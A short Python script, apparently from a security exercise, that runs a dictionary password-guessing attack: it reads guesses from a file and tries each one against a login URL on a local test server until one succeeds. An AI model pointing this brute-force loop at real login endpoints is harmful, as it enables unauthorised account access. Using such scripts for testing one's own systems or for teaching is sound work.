import requests
with open("password.txt") as f:
    guesses = f.readlines()

#guesses =["qwerty", "lq2wer", "12345", "unitec"]

for password in guesses:
    password = password.rstrip()
    response = requests.get(f"http://localhost:8000/login/{password}")
    if response.status_code == 200:
        print(f"login successful{password}")
        break
    else:
        print(f"login unsuccessful for {password}")

    # print(response.txt)